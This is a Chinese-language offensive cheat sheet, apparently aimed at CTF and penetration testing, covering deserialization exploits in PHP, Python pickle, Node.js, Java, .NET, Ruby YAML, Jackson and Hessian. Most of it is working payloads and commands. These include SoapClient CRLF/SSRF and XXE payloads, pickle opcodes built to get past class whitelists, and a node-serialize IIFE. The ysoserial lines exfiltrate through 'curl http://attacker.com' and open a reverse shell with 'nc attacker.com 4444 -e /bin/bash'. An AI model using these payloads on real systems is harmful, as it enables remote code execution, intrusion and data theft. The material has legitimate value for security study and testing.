# Deserialization Vulnerabilities

反序列化漏洞是服务器端逻辑漏洞的核心，主要出现在信任了客户端传入的结构化状态数据时。本指南涵盖主流 Web 语言（PHP、Python、Node.js）的高级反序列化利用战术。

---

## 1. PHP 反序列化高阶技术

### A. GC (Garbage Collector) 垃圾回收提前销毁绕过
在很多挑战中，反序列化类拥有 `__wakeup()`（用于清理属性、阻断危险调用）和 `__destruct()`（存在漏洞的析构函数）。我们可以在 PHP 调用 `__wakeup()` 前，通过迫使垃圾回收器（GC）提前回收对象来直接触发 `__destruct()`。

*   **键名冲突原理**：
    PHP 反序列化数组时，如果遇到重复的键名，前一个键值对应的对象会被覆盖。在覆盖的瞬间，前一个对象失去所有引用，导致 GC 立即将其销毁并调用其 `__destruct()`，之后由于反序列化继续进行，若最后抛出异常导致整个反序列化失败，`__wakeup()` 将永远不会被执行。
*   **Payload 构造**：
    假设存在漏洞类为 `Exploit`。我们构造一个包含两个元素的数组：
    ```php
    // 正常序列化一个数组，包含两个 Exploit 对象，键名相同：
    // a:2:{i:0;O:7:"Exploit":1:{s:4:"cmd";s:6:"whoami";}i:0;i:1;}
    ```
    当 PHP 解析到第二个 `i:0` 时，第一个 `Exploit` 对象被覆盖，GC 立即执行其析构函数（执行恶意逻辑）；由于随后反序列化流程遇到异常或执行完抛错，程序异常中止，跳过了对该对象的常规属性审查。

*   **格式损坏原理**：
    人为破坏反序列化字符串后部的闭合结构，例如：
    ```php
    a:2:{i:0;O:7:"Exploit":1:{s:4:"cmd";s:6:"whoami";}i:1;s:10:"corrupted...
    ```
    解析完第一个对象后，遇到畸形字段抛出异常，反序列化中断，已解析出的第一个对象被释放，触发 `__destruct()`，但未执行 `__wakeup()`。

### B. 无自定义 Gadget 链时的原生类利用
当目标代码中没有定义可以串联的利用链时，我们需要在 PHP 环境中寻找内置的原生类进行反序列化：

*   **`SoapClient` 触发 SSRF（支持 CRLF 头部注入）**：
    利用内置的 `SoapClient` 发起任意 HTTP 请求。配合反序列化可控制其 `_user_agent` 写入 `\r\n` 注入自定义 HTTP 头：
    ```php
    $target = "http://127.0.0.1:80/shell.php";
    $b = new SoapClient(null, array('uri' => 'test', 'location' => $target));
    
    // 通过反序列化修改其 user_agent 属性，注入 Cookie 或 Post Data
    $b->_user_agent = "Antigravity\r\nCookie: session=admin\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 14\r\n\r\ncmd=cat+/flag";
    
    echo serialize($b);
    ```
    当调用反序列化后对象的任意不存在方法（如被 `__call` 魔术方法转接）时，将向内网 `shell.php` 发送携带恶意 POST payload 的 HTTP 请求。

*   **`SimpleXMLElement` 触发 XXE**：
    若反序列化输入会被转入 XML 节点处理，可以通过反序列化 `SimpleXMLElement` 引入外部实体（XXE），实现内网任意文件读取：
    ```php
    $xxe = new SimpleXMLElement("<!DOCTYPE x [<!ENTITY % file SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'><!ENTITY % eval SYSTEM 'http://attacker.com/evil.xml'>%eval;]>", LIBXML_NOENT);
    echo serialize($xxe);
    ```

---

## 2. Python Pickle 序列化漏洞

Python 的 `pickle` 模块不只是解析数据，它其实是一个小型虚拟机（基于 Opcode）。

### A. 基于 `__reduce__` 自动构造
最标准的 RCE 利用是通过定义 `__reduce__` 魔术方法，使其在 `unpickle` 时自动执行系统命令：

```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        # 返回一个元组：(可执行对象, (传给该对象的参数元组,))
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
print(payload)  # 输出二进制序列
```

### B. 自定义手写 Opcode 绕过限制
在防守严格的 CTF 中，后端通常会自定义 `Unpickler.find_class`，限制只能 import 特定的安全白名单模块（如拒绝 `os`, `sys`, `subprocess`）。
我们可以手写 Opcode 来绕过限制，例如利用已经载入白名单的模块或内置函数：

```text
c__builtin__
getattr
(c__builtin__
__import__
S'os'
tR(S'system'
tRS'whoami'
tR.
```
*Opcode 逻辑*：
1.  载入 `__builtin__.getattr`。
2.  载入 `__builtin__.__import__` 并调用它加载 `os` 模块。
3.  通过 `getattr` 提取 `os` 模块的 `system` 方法。
4.  调用该方法执行 `whoami`。

---

## 3. Node.js `node-serialize` 代码注入

Node.js 环境下的 `node-serialize` 库在进行反序列化时，若遇到符合特定前缀的字符串，会动态使用 `eval()` 恢复为 JS 函数：

### A. IIFE (立即调用函数表达式) 注入
如果反序列化的字符串带有 `_$$ND_FUNC$$_` 标记，且该函数在定义完毕后紧跟一对括号 `()`，反序列化程序会自动执行此函数。

*   **Payload 构造**：
    ```json
    {
      "username": "admin",
      "run": "_$$ND_FUNC$$_function() { const exec = require('child_process').execSync; return exec('cat /flag').toString(); }()"
    }
    ```
*   **还原时触发**：
    当服务端执行 `unserialize(payload)` 时，对象恢复过程直接触发立即执行函数，执行系统命令并将回显赋值给对象的 `run` 属性。

---

---

## 4. Java 反序列化 (ysoserial 体系)

```bash
# 指纹: Header/Cookie/Body 含 Base64 编码的 'rO0AB' (Java 序列化 magic)
# 或 'aced0005' (hex)

# ysoserial 常用 gadget 链
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' | base64
java -jar ysoserial.jar CommonsBeanutils1 'touch /tmp/pwned' | base64
java -jar ysoserial.jar Spring1 'id' | base64
java -jar ysoserial.jar Groovy1 'nc attacker.com 4444 -e /bin/bash' | base64

# 检测: 先用 DNSLog gadget
java -jar ysoserial.jar URLDNS 'http://UNIQUE.attacker.com' | base64
# → DNS 收到请求 = 反序列化触发
```

### Gadget 链选择决策

```python
# 按目标环境选 Gadget:
GADGET_MAP = {
    "CommonsCollections 3.x": ["CommonsCollections1", "CommonsCollections3", "CommonsCollections5"],
    "CommonsCollections 4.x": ["CommonsCollections2", "CommonsCollections4", "CommonsCollections6"],
    "CommonsBeanutils": ["CommonsBeanutils1"],
    "Spring Framework": ["Spring1", "Spring2"],
    "Groovy": ["Groovy1"],
    "JDK 7u21": ["Jdk7u21"],
    "JRE 8u20": ["Jre8u20"],
    "RMI": ["RMIRegistryExploit"],
}
```

---

## 5. .NET 反序列化 (ysoserial.net)

```bash
# 指纹: JSON/XML 序列化类型声明、BinaryFormatter magic bytes
# ViewState 中的 __VIEWSTATE 参数

# ysoserial.net
ysoserial.exe -g ObjectDataProvider -c "cmd /c whoami" -f Json.Net
ysoserial.exe -g WindowsIdentity -c "cmd /c whoami" -f SoapFormatter

# TypeConfuseDelegate gadget (通用性最强)
ysoserial.exe -g TypeConfuseDelegate -c "cmd" -f BinaryFormatter
```

---

## 6. Ruby YAML 反序列化

```yaml
# Ruby 2.x/3.x YAML.load (不安全反序列化)
--- !ruby/object:Gem::Installer
i: x
---
--- !ruby/object:ERB
safe_level:
src: |
  <%= `id` %>
---
--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
? |
  foo
  (system('whoami'); @executed = true) unless @executed
  __END__
: !ruby/struct
  defaults:
    :format: json
```

```bash
# 通用 Gadget: 利用 ERB 执行命令
# 把上述 YAML 发送到接受 YAML 的 endpoint
curl -X POST https://target.com/api/import -H "Content-Type: application/x-yaml" --data-binary @payload.yml
```

---

## 7. 反序列化识别速查

```python
# 自动识别序列化格式
MAGIC = {
    b"\xac\xed\x00\x05":      "Java serialized object",
    b"rO0AB":                  "Java serialized (Base64)",
    b"O:":                     "PHP serialized object",
    b"a:":                     "PHP serialized array",
    b"\x80\x02}":              "Python pickle proto 0",
    b"\x80\x03}":              "Python pickle proto 2",
    b"\x80\x04":               "Python pickle proto 4",
    b"_$$ND_FUNC$$_":         "Node.js node-serialize",
    b"AAEAAAD/////":          ".NET BinaryFormatter",
    b"---\n":                  "YAML",
    b"\x00\x01\x00\x00\x00":  ".NET ViewState",
}

def detect_format(data: bytes) -> str:
    for magic, fmt in MAGIC.items():
        if data.startswith(magic):
            return fmt
    # 尝试 Base64 解码
    import base64
    try:
        decoded = base64.b64decode(data)
        for magic, fmt in MAGIC.items():
            if decoded.startswith(magic):
                return f"Base64({fmt})"
    except: pass
    return "unknown"
```

---

---

## 8. 攻击链

```
PHP 反序列化 → GC bypass → __destruct → SoapClient SSRF → 内网 RCE
PHP 反序列化 → SimpleXMLElement XXE → 文件读取 → config 泄露
Python pickle → __reduce__ → os.system → RCE → flag
Python pickle → Opcode 手写 → 绕过 find_class → import os → RCE
Node.js node-serialize → IIFE → require('child_process') → RCE
Java 反序列化 → CommonsCollections5 → Runtime.exec → RCE
Java RMI → JRMPListener → 反弹连接 → RCE
.NET ViewState → ysoserial.net → ObjectDataProvider → cmd 执行
Ruby YAML → ERB gadget → `id` → RCE
YAML 反序列化 → 文件读取 → .env → 数据库密码 → 数据泄露

## 9. Advanced Deserialization (2024-2025)

### Jackson Polymorphic (Java)

```json
// Jackson enableDefaultTyping() → 任意类实例化
["com.zaxxer.hikari.HikariConfig", {"metricRegistry": "ldap://attacker.com/exp"}]
["org.springframework.context.support.ClassPathXmlApplicationContext", ["http://attacker.com/beans.xml"]]
```

### Hessian Dubbo Gadget

```java
// Hessian 不走 readObject() → 绕过 Java deserialization filter
// 利用: SpringPartiallyComparableAdvisorHolder → JNDI
// 或: SwingLazyValue → Runtime.exec
Map map = new HashMap();
map.put("lazyValue", new UIDefaults.ProxyLazyValue("javax.script.ScriptEngineManager"));
// Hessian 反序列化 → createValue() → ScriptEngineManager
```

### JSON.Net TypeNameHandling

```json
// TypeNameHandling.None 以外的所有模式都危险
{"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
 "MethodName": "Start", "MethodParameters": {"$type": "...", "values": ["cmd", "/c whoami"]}}
```

### JDK 17/21 Internal Gadgets

```python
# JDK 8 的经典 gadget 被移除后，攻击者转向 JDK 内部类:
# - java.util.PriorityQueue + Proxy (still works)
# - javax.management.BadAttributeValueExpException
# - sun.print.UnixPrintServiceLookup (file read via SSRF-like)
# - java.nio.file (Path objects deserialization)
```

记录: 原始序列化 hex/base64、识别出的格式、使用的 gadget 链、DNS callback 验证、最终命令执行结果

